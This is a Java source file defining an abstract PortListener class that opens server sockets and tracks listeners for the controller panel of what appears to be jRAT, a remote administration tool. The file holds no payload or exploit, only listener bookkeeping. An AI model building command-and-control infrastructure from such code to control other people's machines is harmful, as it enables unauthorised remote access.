package io.jrat.controller.net;

import io.jrat.controller.Main;
import io.jrat.controller.ui.panels.PanelMainSockets;
import java.net.ServerSocket;
import java.util.ArrayList;
import java.util.List;

public abstract class PortListener implements Runnable {
	
	public static List<PortListener> listeners = new ArrayList<PortListener>();

	protected ServerSocket server;
	protected int timeout = 15 * 1000;
	protected boolean listening = false;
	protected String pass;
	protected String name;
	protected int port;
	protected int type;
	
	public PortListener(String name, int port, int timeout, String pass, int type) throws Exception {		
		this.name = name;
		this.port = port;
		this.timeout = timeout;
		this.pass = pass;
		this.type = type;
		listeners.add(this);
		
		try {
			this.server = new ServerSocket(port);
		} catch (Exception ex) {
			ex.printStackTrace();
			PanelMainSockets.instance.getModel().addRow(new Object[] { "Not listening", name, port, timeout, pass });
		}
	}
	
	public ServerSocket getServer() {
		return server;
	}

	public int getTimeout() {
		return timeout;
	}

	public boolean isListening() {
		return listening;
	}

	public String getPass() {
		return pass;
	}

	public String getName() {
		return name;
	}
	
	public int getPort() {
		return port;
	}
	
	public int getType() {
		return type;
	}
	
	public void start() {
		if (Main.instance != null) {
			Main.instance.getPanelSockets().getModel().addRow(new Object[] { "Listening", name, server.getLocalPort(), timeout, pass });
		}
		
		new Thread(this, "Port " + server.getLocalPort()).start();
	}

	public static PortListener getListener(String name, int port, int timeout, String pass) {
		for (int i = 0; i < PortListener.listeners.size(); i++) {
			PortListener con = PortListener.listeners.get(i);
			if (con.name.equals(name) && con.pass.equals(pass) && con.port == port && con.getTimeout() == timeout) {
				return con;
			}
		}

		return null;
	}

	public static PortListener getListener(String name) {
		for (int i = 0; i < PortListener.listeners.size(); i++) {
			PortListener con = PortListener.listeners.get(i);
			if (con.name.equals(name)) {
				return con;
			}
		}

		return null;
	}
	
}
